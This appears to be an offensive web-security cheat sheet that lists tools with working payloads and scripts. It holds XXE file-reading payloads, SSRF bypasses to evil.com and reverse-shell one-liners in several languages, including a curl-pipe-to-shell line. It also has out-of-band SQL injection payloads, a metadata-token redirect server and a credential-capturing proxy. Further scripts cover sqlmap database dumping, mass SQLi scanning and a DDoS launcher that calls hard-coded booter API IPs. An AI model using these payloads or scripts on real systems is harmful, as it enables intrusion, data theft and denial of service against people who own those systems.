<br>https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
<br># This cross-site scripting (XSS) cheat sheet contains many vectors that can help you bypass WAFs and filters. You can select vectors by the event, tag or browser and a proof of concept is included for every vector.
<br>https://www.gremwell.com/firefox-xss-302
<br># Forcing Firefox to Execute XSS Payloads during 302 Redirects.

<br># XXE
<br>https://portswigger.net/web-security/xxe
<br># XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
<br>```<?xml version="1.0" encoding="UTF-8"?>```
<br>```<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>```
<br>```<stockCheck><productId>&xxe;</productId></stockCheck>```

https://phonexicum.github.io/infosec/xxe.html
<br># Information Security PENTEST XXE
<br>```<!DOCTYPE foo SYSTEM "http://xpto.burpcollaborator.net/xpto.dtd">```

https://github.com/GoSecure/dtd-finder
<br># Identify DTDs on filesystem snapshot and build XXE payloads using those local DTDs.

<br># SSRF
<br>https://www.blackhat.com/us-17/briefings.html#a-new-era-of-ssrf-exploiting-url-parser-in-trending-programming-languages
<br># We propose a new exploit technique that brings a whole-new attack surface to bypass SSRF (Server Side Request Forgery) protections.
<br>```http://1.1.1.1&@2.2.2.2#@3.3.3.3/```
<br>```http://127.0.0.1:11211:80/```
<br>```http://google.com#@evil.com/```
<br>```http://foo@evil.com:80@google.com/```
<br>```http://foo@evil.com:80 @google.com/```
<br>```http://127.0.0.1\tfoo.google.com/```
<br>```http://127.0.0.1%09foo.google.com/```
<br>```http://127.0.0.1%2509foo.google.com/```
<br>```http://127.0.0.1:11211#@google.com:80/```
<br>```http://foo@127.0.0.1:11211@google.com:80/```
<br>```http://foo@127.0.0.1 @google.com:11211/```

### Deserialization
https://github.com/joaomatosf/jexboss
<br># JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server and others Java Platforms, Frameworks, Applications, etc.

https://github.com/pimps/JNDI-Exploit-Kit
<br># This is a forked modified version of the great exploitation tool created by @welk1n (https://github.com/welk1n/JNDI-Injection-Exploit). 

### <a name="SSRF"></a>SSRF (Server-Side Request Forgery)
https://lab.wallarm.com/blind-ssrf-exploitation/
<br># There is such a thing as SSRF. There’s lots of information about it, but here is my quick summary.

https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/
<br># A Glossary of Blind SSRF Chains.

### DNS Rebinding
http://rebind.it
<br># Singularity of Origin is a tool to perform DNS rebinding attacks. It includes the necessary components to rebind the IP address of the attack server DNS name to the target machine's IP address and to serve attack payloads to exploit vulnerable software on the target machine.

https://github.com/brannondorsey/dns-rebind-toolkit
<br># DNS Rebind Toolkit is a frontend JavaScript framework for developing DNS Rebinding exploits against vulnerable hosts and services on a local area network (LAN).

https://github.com/brannondorsey/whonow
<br># A malicious DNS server for executing DNS Rebinding attacks on the fly.

https://nip.io
<br># Dead simple wildcard DNS for any IP Address

https://sslip.io
<br># sslip.io is a DNS (Domain Name System) service that, when queried with a hostname with an embedded IP address, returns that IP Address.

http://1u.ms/
<br># This is a small set of zero-configuration DNS utilities for assisting in detection and exploitation of SSRF-related vulnerabilities. It provides easy to use DNS rebinding utility, as well as a way to get resolvable resource records with any given contents.

### SMTP Header Injection
https://www.acunetix.com/blog/articles/email-header-injection/
<br># It is common practice for web pages and web applications to implement contact forms, which in turn send email messages to the intended recipients. Most of the time, such contact forms set headers. These headers are interpreted by the email library on the web server and turned into resulting SMTP commands, which are then processed by the SMTP server.
<br>```POST /contact.php HTTP/1.1```
<br>```Host: www.example2.com```
<br>``` ```
<br>```name=Best Product\nbcc: everyone@example3.com&replyTo=blame_anna@example.com&message=Buy my product!```

### Reverse Shell
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
<br># If you’re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you’ll probably want an interactive shell.
<br># Bash
<br>```bash -i >& /dev/tcp/10.0.0.1/8080 0>&1```

<br># PERL
<br>```perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```

<br># Python
<br>```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```

<br># PHP
<br>```php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'```

<br># Ruby
<br>```ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'```

<br># Netcat
<br>```nc -e /bin/sh 10.0.0.1 1234```
<br>```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f```

<br># Java
<br>```r = Runtime.getRuntime()```
<br>```p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])```
<br>```p.waitFor()```

<br># xterm
<br>```xterm -display 10.0.0.1:1```
<br>```Xnest :1```
<br>```xhost +targetip```

https://reverse-shell.sh/
<br># Reverse Shell as a Service
<br>```nc -l 1337```
<br>```curl https://reverse-shell.sh/yourip:1337 | sh```

https://github.com/calebstewart/pwncat
<br># pwncat is a post-exploitation platform for Linux targets.

### <a name="SQLi-Manual"></a>SQLi (SQL Injection)
https://arxiv.org/abs/1303.3047
<br># This paper describes an advanced SQL injection technique where DNS resolution process is exploited for retrieval of malicious SQL query results.

<br># Oracle
<br>```'||(SELECT%20UTL_INADDR.GET_HOST_ADDRESS('xpto.example.com'))||'```
<br>```'||(SELECT%20UTL_HTTP.REQUEST('http://xpto.example.com')%20FROM%20DUAL)||'```
<br>```'||(SELECT%20HTTPURITYPE('http://xpto.example.com').GETCLOB()%20FROM%20DUAL)||'```
<br>```'||(SELECT%20DBMS_LDAP.INIT(('xpto.example.com',80)%20FROM%20DUAL)||'```

<br># MySQL
<br>```'||(SELECT%20LOAD_FILE('\\xpto.example.com'))||'```

<br># Microsoft SQL Server
<br>```'+;EXEC('master..xp_dirtree"\\xpto.example.com\"');+'```
<br>```'+;EXEC('master..xp_fileexist"\\xpto.example.com\"');+'```
<br>```'+;EXEC('master..xp_subdirs"\\xpto.example.com\"');+'```

<br># PostgreSQL
<br>```'||;COPY%20users(names)%20FROM%20'\\xpto.example.com\';||'```

### <a name="SSTI"></a>SSTI (Server Side Template Injection)
https://www.youtube.com/watch?v=SN6EVIG4c-0
<br># Template Injections (SSTI) in 10 minutes

https://portswigger.net/research/server-side-template-injection
<br># Template engines are widely used by web applications to present dynamic data via web pages and emails. Unsafely embedding user input in templates enables Server-Side Template Injection, a frequently critical vulnerability that is extremely easy to mistake for Cross-Site Scripting (XSS), or miss entirely. Unlike XSS, Template Injection can be used to directly attack web servers' internals and often obtain Remote Code Execution (RCE), turning every vulnerable application into a potential pivot point.

https://github.com/epinna/tplmap
<br># Tplmap assists the exploitation of Code Injection and Server-Side Template Injection vulnerabilities with a number of sandbox escape techniques to get access to the underlying operating system.
<br>```tplmap.py --os-shell -u 'http://www.example.com/page?name=John'```

### <a name="WebDAV"></a>WebDAV (Web Distributed Authoring and Versioning)
http://www.webdav.org/cadaver/
<br># cadaver is a command-line WebDAV client for Unix.

https://github.com/cldrn/davtest
<br># This program attempts to exploit WebDAV enabled servers.

### Generic Tools
https://gchq.github.io/CyberChef/
<br># The Cyber Swiss Army Knife

https://packettotal.com/
<br># Pcap analysis and samples

### <a name="General-Manual"></a>General
https://httpbin.org/
<br># A simple HTTP Request & Response Service.

<br># Print only response headers for any method with curl
<br>```curl -skSL -D - https://www.example.com -o /dev/null```

<br># Pure bash multhread script
```
#!/bin/bash

FILE="${1}"
THREADS="${2}"
TIMEOUT="${3}"
CMD="${4}"
NUM=$(wc -l ${FILE} | awk '{ print $1 }')
THREAD=0
NUMDOM=0
while read SUBDOMAIN; do
        PIDSTAT=0
        if [ $THREAD -lt $THREADS ]; then
                eval timeout ${TIMEOUT} ${CMD} 2>/dev/null &
                PIDS[$THREAD]="${!}"
                let THREAD++
                let NUMDOM++
                echo -ne "\r>Progress: ${NUMDOM} of ${NUM} ($(awk "BEGIN {printf \"%0.2f\",(${NUMDOM}*100)/${NUM}}")%)\r"
        else
                while [ ${PIDSTAT} -eq 0 ]; do
                        for j in "${!PIDS[@]}"; do
                                kill -0 "${PIDS[j]}" > /dev/null 2>&1
                                PIDSTAT="${?}"
                                if [ ${PIDSTAT} -ne 0 ]; then
                                        eval timeout ${TIMEOUT} ${CMD} 2>/dev/null &
                                        PIDS[j]="${!}"
                                        let NUMDOM++
                                        echo -ne "\r>Progress: ${NUMDOM} of ${NUM} ($(awk "BEGIN {printf \"%0.2f\",(${NUMDOM}*100)/${NUM}}")%)\r"
                                        break
                                fi
                        done
                done
        fi
done < ${FILE}
wait
```

<br># Reverse Proxy
<br>```mitmdump --certs ~/cert/cert.pem --listen-port 443 --scripts script.py --set block_global=false --mode reverse:https://example.com/``` # Good for capture credentials
```
$ cat script.py
import mitmproxy.http
from mitmproxy import ctx

def request(flow):
    if flow.request.method == "POST":
        ctx.log.info(flow.request.get_text())
```

<br># Fake HTTP Server
<br>```while true ; do echo -e "HTTP/1.1 200 OK\nContent-Length: 0\n\n" | nc -vl 1.2.3.4 80; done```
<br>```socat -v -d -d TCP-LISTEN:80,crlf,reuseaddr,fork 'SYSTEM:/bin/echo "HTTP/1.1 200 OK";/bin/echo "Content-Length: 2";/bin/echo;/bin/echo "OK"'```
<br>```socat -v -d -d TCP-LISTEN:80,crlf,reuseaddr,fork 'SYSTEM:/bin/echo "HTTP/1.1 302 Found";/bin/echo "Content-Length: 0";/bin/echo "Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";/bin/echo;/bin/echo'```
<br>```FILE=image.jpg;socat -v -d -d TCP-LISTEN:80,fork "SYSTEM:/bin/echo 'HTTP/1.1 200 OK';/bin/echo 'Content-Length: '`wc -c<$FILE`;/bin/echo 'Content-Type: image/png';/bin/echo;dd 2>/dev/null<$FILE"``` # Present an image
<br>```python2 -m SimpleHTTPServer 8080```
<br>```python3 -m http.server 8080```
<br>```php -S 0.0.0.0:80```
<br>```ruby -run -e httpd . -p 80```
<br>```busybox httpd -f -p 80```
    
<br># Fake HTTPS Server
<br>```openssl req -new -x509 -keyout test.key -out test.crt -nodes```
<br>```cat test.key test.crt > test.pem```
<br>```socat -v -d -d openssl-listen:443,crlf,reuseaddr,cert=test.pem,verify=0,fork 'SYSTEM:/bin/echo "HTTP/1.1 200 OK";/bin/echo "Content-Length: 2";/bin/echo;/bin/echo "OK"'```
<br>```socat -v -d -d openssl-listen:443,crlf,reuseaddr,cert=web.pem,verify=0,fork 'SYSTEM:/bin/echo "HTTP/1.1 302 Found";/bin/echo "Content-Length: 0";/bin/echo "Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";/bin/echo;/bin/echo'```
<br>```stunnel stunnel.conf``` # Check https://www.stunnel.org/

<br># Python 3 Simple HTTPS Server
```
    import http.server, ssl
    server_address = ('0.0.0.0', 443)
    httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
    httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='/path/cert.pem', ssl_version=ssl.PROTOCOL_TLS)
    httpd.serve_forever()
```

<br># Fake FTP Server
<br>```python -m pyftpdlib --directory=/tmp/dir/ --port=21```

<br># Check HTTP or HTTPS
<br>```while read i; do curl -m 15 -ki http://$i &> /dev/null; if [ $? -eq 0 ]; then echo $i; fi; done < subdomains.txt```
<br>```while read i; do curl -m 15 -ki https://$i &> /dev/null; if [ $? -eq 0 ]; then echo $i; fi; done < subdomains.txt```

<br># Ten requests in parallel
<br>```xargs -I % -P 10 curl -H 'Connection: close' -s -D - -o /dev/null https://example.com < <(printf '%s\n' {1..10000})```

<br># Access target directly through IP address
<br>```http://1.2.3.4```
<br>```https://1.2.3.4```

<br># Trim space and newlines on bash variable
<br>```"${i//[$'\t\r\n ']}"```

https://gtfobins.github.io/
<br># GTFOBins is a curated list of Unix binaries that can used to bypass local security restrictions in misconfigured systems.

https://www.guyrutenberg.com/2014/05/02/make-offline-mirror-of-a-site-using-wget/
<br># Make Offline Mirror of a Site using wget
<br>```wget -mkEpnp https://www.example.com/```

<br># Referer spoofing
<br>```<base href="https://www.google.com/">```
<br>```<style>```
<br>```@import 'https://CSRF.vulnerable.example/';```
<br>```</style>```

https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html
<br># Check PreAuth RCE on Palo Alto GlobalProtect
<br>```time curl -s -d 'scep-profile-name=%9999999c' https://${HOST}/sslmgr >/dev/null```
<br>```time curl -s -d 'scep-profile-name=%99999999c' https://${HOST}/sslmgr >/dev/null```
<br>```time curl -s -d 'scep-profile-name=%999999999c' https://${HOST}/sslmgr >/dev/null```

https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html
<br># How I Chained 4 Bugs(Features?) into RCE on Amazon Collaboration System (bypass with /..;/)

https://docs.google.com/presentation/d/1jqnpPe0A7L_cVuPe1V0XeW6LOHvMYg5PBqHd96SScJ8/
<br># Routing To Another Backend , Deserve Spending Hours AND Hours On Its So Inspired By @samwcyo's Talk " Attacking Secondary Contexts in Web Applications " , I Have Been Collecting A Lot Of Stuff To PWN This Backend.

https://medium.com/@ricardoiramar/reusing-cookies-23ed4691122b
<br># This is a story how I accidentally found a common vulnerability across similar web applications just by reusing cookies on different subdomains from the same web application.



- [Web_Application_Penetration_Testing_Checklist](https://github.com/Ondrik8/Web-Application-Pentest-Checklist/blob/main/Web_Application_Penetration_Testing_Checklist_by_Tushar_Verma.pdf)


- [SQLmap](https://github.com/sqlmapproject/sqlmap)
- [XAttacker](https://github.com/Moham3dRiahi/XAttacker)
- [Fuxploider](https://github.com/almandin/fuxploider)
- [Wordpresscan](https://github.com/swisskyrepo/Wordpresscan)
- [SiteBroker](https://github.com/Anon-Exploiter/SiteBroker)
- [NoSQLMap](https://github.com/codingo/NoSQLMap)
- [Sqli-scanner](https://github.com/the-c0d3r/sqli-scanner)
- [Joomscan](https://github.com/rezasp/joomscan)
- [Metagoofil](https://github.com/laramies/metagoofil)
- [Sublist3r](https://github.com/aboul3la/Sublist3r)
- [WAFNinja](https://github.com/khalilbijjou/WAFNinja)
- [Dirsearch](https://github.com/maurosoria/dirsearch)
- [XSStrike](https://github.com/s0md3v/XSStrike)
- [LinksF1nd3r](https://github.com/ihebski/LinksF1nd3r)
- [Rapidscan](https://github.com/skavngr/rapidscan)

#### Auto_scanners

![hot](https://cirt.net/files/alienlogo_3.gif)

- [BruteX](https://github.com/1N3/BruteX)
- [BlackWidow](https://github.com/1N3/BlackWidow)
- [S3Scanner](https://github.com/sa7mon/S3Scanner)
- [CRLF-Injection-Scanner](https://github.com/MichaelStott/CRLF-Injection-Scanner)
- [jaeles](https://github.com/jaeles-project/jaeles)
- [kube-scan](https://github.com/random-robbie/kube-scan)
- [Subrake](https://github.com/hash3liZer/Subrake)
- [Osmedeus](https://github.com/j3ssie/Osmedeus)
- [nikto](https://github.com/sullo/nikto)

#### sqlmap automate

```
#!/bin/bash

clear



echo "
              *         *      *         *
          ***          **********          ***
       *****           **********           *****
     *******           **********           *******
   **********         ************         **********
  ****************************************************
 ******************************************************
********************************************************
********************************************************
********************************************************
 ******************************************************
  ********      ************************      ********
   *******       *     *********      *       *******
     ******             *******              ******
       *****             *****              *****
          ***             ***              ***
            **             *              **
"

echo
echo -n "[+] Website: " && read site
echo

python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=charencode,space2comment,between,modsecurityzeroversioned --dbs --batch
echo
echo -n "[+] DB: " && read db
echo
		
python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=between,modsecurityzeroversioned  -D $db --tables
																		 
echo
echo -n "[+] Table: " && read tb
echo

python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=between,modsecurityzeroversioned --batch -D $db -T $tb --columns

echo
echo -n "[+] Column: " && read cl
echo

python2 sqlmap.py -u $site --threads=10 --level=3 --risk=3 --random-agent --is-dba --current-db --tamper=between,modsecurityzeroversioned --batch -D $db -T $tb -C $cl --dump

```
#### FireWave-Mass-Sql-Scan

usage: python FireWave.py domains.txt

Required: requests and colorama

install: pip install requests

install: pip install colorama

```
# coding: utf-8

import sys
import os



os.system("clear||cls")

try:
        import requests
except:
        print ("install requests: pip install requests")
	      						
try:
        from colorama import *

except:
        print ("install colorama: pip install colorama")
				  
print (Style.BRIGHT + Fore.CYAN + '''
 /$$$$$$$$ /$$                     /$$      /$$
| $$_____/|__/                    | $$  /$ | $$
| $$       /$$  /$$$$$$   /$$$$$$ | $$ /$$$| $$  /$$$$$$  /$$    /$$ /$$$$$$
| $$$$$   | $$ /$$__  $$ /$$__  $$| $$/$$ $$ $$ |____  $$|  $$  /$$//$$__  $$
| $$__/   | $$| $$  \__/| $$$$$$$$| $$$$_  $$$$  /$$$$$$$ \  $$/$$/| $$$$$$$$
| $$      | $$| $$      | $$_____/| $$$/ \  $$$ /$$__  $$  \  $$$/ | $$_____/
| $$      | $$| $$      |  $$$$$$$| $$/   \  $$|  $$$$$$$   \  $/  |  $$$$$$$
|__/      |__/|__/       \_______/|__/     \__/ \_______/    \_/    \_______/
Usage: FireWave.py <target.txt> \n''' + Fore.RESET + Style.RESET_ALL)

sql = "%5c"
logs = []
webi = open('result.txt','w')
headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1'}

if len(sys.argv) >= 2:
   target = sys.argv[1]
   with open (target) as tag:
       lista = tag.readlines()
       for listy in lista:
           x = listy.rstrip('\n')
           y = sql.rstrip('\n')
           web = x+y
           web = web.strip('\n')
           up = requests.get(web, headers=headers)
           if "mysql_num_rows()" in up.text or "Mysql" in up.text or "Sql syntax" in up.text or "Warning: mysql_fetch_array()" in up.text or "valid MySQL result" in up.text or "MySqlClient." in up.text or "mysql_fetch_assoc()" in up.text or "mysql_fetch_array" in up.text or "session_start()"in up.text or "getimagesize()" in up.text or "is_writable" in up.text or "unknown()" in up.text or "mysql_result()" in up.text or "pg_exec()" in up.text or "mysql_query()" in up.text or  "array_merge" in up.text or "Pregmatch()" in up.text or "filesize()" in up.text or "require()"in up.text or  "You have an error in your SQL syntax" in up.text or  "Warning: mysql" in up.text or "function.mysql" in up.text or "MySQL result index" in up.text or "MySQL Error" in up.text or "MySQL ODBC" in up.text or  "MySQL Driver" in up.text or "mysqli.query" in up.text or "numrows" in up.text or "mysql error:" in up.text or "supplied argument is not a valid MySQL result resource" in up.text or  "on MySQL result index" in up.text or "Error Executing Database Query" in up.text or "mysql" in up.text or "SQL" in up.text:
              print
              print ("[+] Vull SQL: " + Style.BRIGHT + Fore.GREEN + x + Fore.RESET + Style.RESET_ALL)
									
	      logs.append(x+'\n')
           else:
                print 
                print ("[!] Not Vull: " + Style.BRIGHT +  Fore.RED + x + Fore.RESET + Style.RESET_ALL)

webi.writelines(logs)
webi.close()
```
#### DebWave
Enumerador de DNS com WordList, feito em python utilizando Sys e Socket!

Required Socket and Sys

usage: debwave.py target list.txt

remove http and https !

exemple http://www.google.com/ -> google.com
```
import socket
import sys
import os

os.system("clear||cls")

print ("""
                             @@@
                             @@@
                              @@@                       H A P P Y
                              @@@
                      @@@@@@@@@@@@@@@@@@@@@@         H A L L O W E E N
                    @@@@@@@@@@@@@@@@@@@@@@@@@@
                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                @@@@@@@@ @@@@@@@@@@@@@@@@ @@@@@@@@
              @@@@@@@@@   @@@@@@@@@@@@@@   @@@@@@@@@
            @@@@@@@@@@     @@@@@@@@@@@@     @@@@@@@@@@
           @@@@@@@@@@       @@@@  @@@@       @@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
           @@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@@
            @@@@@@@@  @@ @@ @@ @@ @@ @@ @@ @  @@@@@@@@
              @@@@@@@                        @@@@@@@
                @@@@@@  @@ @@ @@ @@ @@ @@ @ @@@@@@
                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                    @@@@@@@@@@@@@@@@@@@@@@@@@@
                      @@@@@@@@@@@@@@@@@@@@@@
 		   | DNS Enumering BruteForce |
		   |           ./O8           |""")

print
print "Usage: DebWave.py <target> <list.txt> "
print

if len(sys.argv) >= 2:
   target = sys.argv[1]
   lista = sys.argv[2]
   with open (lista) as arquivo:
       brute = arquivo.readlines()
       for btf in brute:
           DNS = btf.rstrip("\n") + "." + target
           try:
               print "[#] DNS: " + DNS + " : "+ socket.gethostbyname(DNS)
           except socket.gaierror:
               pass
```

#### DDOS

```
import os
import time
# Coding by KriptonWave

# Twitter: @KryptonWave1
# Discord: KriptonWave#9010


os.system("clear||cls")


index = (r"""
██████╗ ██╗████████╗██╗ ██████╗ █████╗ 
██╔══██╗██║╚══██╔══╝██║██╔════╝██╔══██╗
██████╔╝██║   ██║   ██║██║     ███████║
██╔═══╝ ██║   ██║   ██║██║     ██╔══██║
██║     ██║   ██║   ██║╚██████╗██║  ██║
╚═╝     ╚═╝   ╚═╝   ╚═╝ ╚═════╝╚═╝  ╚═╝
""")
 
menu = (r"""[1] NTP      [4] ACK      [7] STROM
[2] DNS      [5] XMASS    [8] COD
[3] LDAP     [6] SSYN""")


headers = {'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1'}
          

try:
    import requests

except:
       print (index)
       print ("[!] Install requests: pip install requests")
       exit()


print (index)
print (menu)

print (" ")
esc = input("Numero da opção desejada: ")
print (" ")
host = input("Target/Host: ")
port = input("Port: ")
time = input("Time: ")

if esc == "1":
   esc = "NTP"

   api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
   ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

   for x in ips:

       atk = ("http://"+x+"/"+api)
       r = requests.get(atk, headers=headers)
              
       if "Attack Launch On" in r.text:
            while True:
               print (f"[+] ATACK INICIADO EM: {host}")
       else:
            print ("[!] ERROR")
            exit()

elif esc == "2":
     esc = "DNS"
     
     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:

         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)
	 
         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "3":
     esc = "LDAP"

     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)
 
         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "4":
     esc = "ACK"
     
     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()
elif esc == "5":
     esc = "XMASS"
     
     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk,headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "6":
     esc = "SSYN"

     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "7":
     esc = "STROM"

     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]
     
     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

elif esc == "8":
     esc = "COD"

     api = (f"api.php?&host={host}&port={port}&time={time}&method={esc}")
     ips = ["185.212.47.32","185.158.248.182","176.10.118.226","185.212.47.205","31.214.157.239"]

     for x in ips:
         atk = ("http://"+x+"/"+api)
         r = requests.get(atk, headers=headers)

         if "Attack Launch On" in r.text:
            while True:
                print (f"[+] ATACK INICIADO EM: {host}")
         else:
              print ("[!] ERROR")
              exit()

```

```

"          _                      _          "
"   _     /||       .   .        ||\     _   "
"  ( }    \||D    '   '     '   C||/    { %  "
" | /\__,=_[_]   '  .   . '       [_]_=,__/\ |"
" |_\_  |----|                    |----|  _/_|"
" |  |/ |    |                    |    | \|  |"
" |  /_ |    |                    |    | _\  |"

	It is all fun and games until someone gets hacked!
 
------------------------------------------------------------------------------------------
Explanations:

cache: If you include other words in the query, Google will highlight those words within
	the cached document. For instance, [cache:www.google.com web] will show the cached
	content with the word “web” highlighted. This functionality is also accessible by
	clicking on the “Cached” link on Google’s main results page. The query [cache:] will
	show the version of the web page that Google has in its cache. For instance,
	[cache:www.google.com] will show Google’s cache of the Google homepage. Note there
	can be no space between the “cache:” and the web page url.
------------------------------------------------------------------------------------------
link: The query [link:] will list webpages that have links to the specified webpage.
	For instance, [link:www.google.com] will list webpages that have links pointing to the
	Google homepage. Note there can be no space between the “link:” and the web page url.
------------------------------------------------------------------------------------------
related: The query [related:] will list web pages that are “similar” to a specified web
	page. For instance, [related:www.google.com] will list web pages that are similar to
	the Google homepage. Note there can be no space between the “related:” and the web
	page url.
------------------------------------------------------------------------------------------
info: The query [info:] will present some information that Google has about that web
	page. For instance, [info:www.google.com] will show information about the Google
	homepage. Note there can be no space between the “info:” and the web page url.
------------------------------------------------------------------------------------------
define: The query [define:] will provide a definition of the words you enter after it,
	gathered from various online sources. The definition will be for the entire phrase
	entered (i.e., it will include all the words in the exact order you typed them).
------------------------------------------------------------------------------------------
stocks: If you begin a query with the [stocks:] operator, Google will treat the rest
	of the query terms as stock ticker symbols, and will link to a page showing stock
	information for those symbols. For instance, [stocks: intc yhoo] will show information
	about Intel and Yahoo. (Note you must type the ticker symbols, not the company name.)
------------------------------------------------------------------------------------------
site: If you include [site:] in your query, Google will restrict the results to those
	websites in the given domain. For instance, [help site:www.google.com] will find pages
	about help within www.google.com. [help site:com] will find pages about help within
	.com urls. Note there can be no space between the “site:” and the domain.
------------------------------------------------------------------------------------------
allintitle: If you start a query with [allintitle:], Google will restrict the results
	to those with all of the query words in the title. For instance,
	[allintitle: google search] will return only documents that have both “google”
	and “search” in the title.
------------------------------------------------------------------------------------------
intitle: If you include [intitle:] in your query, Google will restrict the results
	to documents containing that word in the title. For instance, [intitle:google search]
	will return documents that mention the word “google” in their title, and mention the
	word “search” anywhere in the document (title or no). Note there can be no space
	between the “intitle:” and the following word. Putting [intitle:] in front of every
	word in your query is equivalent to putting [allintitle:] at the front of your
	query: [intitle:google intitle:search] is the same as [allintitle: google search].
------------------------------------------------------------------------------------------
allinurl: If you start a query with [allinurl:], Google will restrict the results to
	those with all of the query words in the url. For instance, [allinurl: google search]
	will return only documents that have both “google” and “search” in the url. Note
	that [allinurl:] works on words, not url components. In particular, it ignores
	punctuation. Thus, [allinurl: foo/bar] will restrict the results to page with the
	words “foo” and “bar” in the url, but won’t require that they be separated by a
	slash within that url, that they be adjacent, or that they be in that particular
	word order. There is currently no way to enforce these constraints.
------------------------------------------------------------------------------------------
inurl: If you include [inurl:] in your query, Google will restrict the results to
	documents containing that word in the url. For instance, [inurl:google search] will
	return documents that mention the word “google” in their url, and mention the word
	“search” anywhere in the document (url or no). Note there can be no space between
	the “inurl:” and the following word. Putting “inurl:” in front of every word in your
	query is equivalent to putting “allinurl:” at the front of your query:
	[inurl:google inurl:search] is the same as [allinurl: google search].
------------------------------------------------------------------------------------------
